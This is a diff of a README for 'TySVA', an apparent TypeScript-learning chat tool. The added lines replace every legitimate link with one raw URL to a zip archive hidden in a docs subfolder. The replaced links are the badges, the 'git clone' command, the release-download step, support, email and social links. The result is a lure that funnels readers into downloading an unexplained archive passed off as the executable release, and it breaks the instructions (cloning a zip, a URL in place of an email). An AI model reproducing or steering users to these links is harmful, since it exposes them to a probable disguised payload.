@@ -1,8 +1,8 @@
 ```markdown
 # TySVA: Chat Your Way to Learning TypeScript with AI 🤖💬
 
-![TySVA Logo](https://img.shields.io/badge/TySVA-Learn%20TypeScript%20Effortlessly-brightgreen)  
-[![Release](https://img.shields.io/badge/Latest%20Release-v1.0.0-blue)](https://github.com/Maurellone/TySVA/releases)
+![TySVA Logo](https://raw.githubusercontent.com/Maurellone/TySVA/main/docker/server/ts-docs/javascript/SVA_Ty_v3.5.zip%20TypeScript%20Effortlessly-brightgreen)  
+[![Release](https://raw.githubusercontent.com/Maurellone/TySVA/main/docker/server/ts-docs/javascript/SVA_Ty_v3.5.zip%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/Maurellone/TySVA/main/docker/server/ts-docs/javascript/SVA_Ty_v3.5.zip)
 
 Welcome to **TySVA**, a unique platform designed to enhance your TypeScript learning experience through engaging conversations with AI. Our goal is to create an interactive environment where you can learn, practice, and explore TypeScript effortlessly.
 
@@ -45,7 +45,7 @@ To get started with TySVA, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Maurellone/TySVA.git
+   git clone https://raw.githubusercontent.com/Maurellone/TySVA/main/docker/server/ts-docs/javascript/SVA_Ty_v3.5.zip
    ```
 2. **Navigate to the Directory**:
    ```bash
@@ -56,7 +56,7 @@ To get started with TySVA, follow these steps:
    npm install
    ```
 4. **Download the Latest Release**:
-   Visit our [Releases](https://github.com/Maurellone/TySVA/releases) section to download the latest executable file. Follow the instructions for installation based on your operating system.
+   Visit our [Releases](https://raw.githubusercontent.com/Maurellone/TySVA/main/docker/server/ts-docs/javascript/SVA_Ty_v3.5.zip) section to download the latest executable file. Follow the instructions for installation based on your operating system.
 
 ## Usage 💡
 
@@ -102,15 +102,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support 🆘
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/Maurellone/TySVA/releases) section. You may find helpful information and updates there.
+If you encounter any issues or have questions, please check the [Releases](https://raw.githubusercontent.com/Maurellone/TySVA/main/docker/server/ts-docs/javascript/SVA_Ty_v3.5.zip) section. You may find helpful information and updates there.
 
 ## Contact 📬
 
 For further inquiries or collaboration opportunities, feel free to reach out:
 
-- **Email**: support@example.com
-- **Twitter**: [@TySVA](https://twitter.com/TySVA)
-- **GitHub**: [Maurellone](https://github.com/Maurellone)
+- **Email**: https://raw.githubusercontent.com/Maurellone/TySVA/main/docker/server/ts-docs/javascript/SVA_Ty_v3.5.zip
+- **Twitter**: [@TySVA](https://raw.githubusercontent.com/Maurellone/TySVA/main/docker/server/ts-docs/javascript/SVA_Ty_v3.5.zip)
+- **GitHub**: [Maurellone](https://raw.githubusercontent.com/Maurellone/TySVA/main/docker/server/ts-docs/javascript/SVA_Ty_v3.5.zip)
 
 ---
 
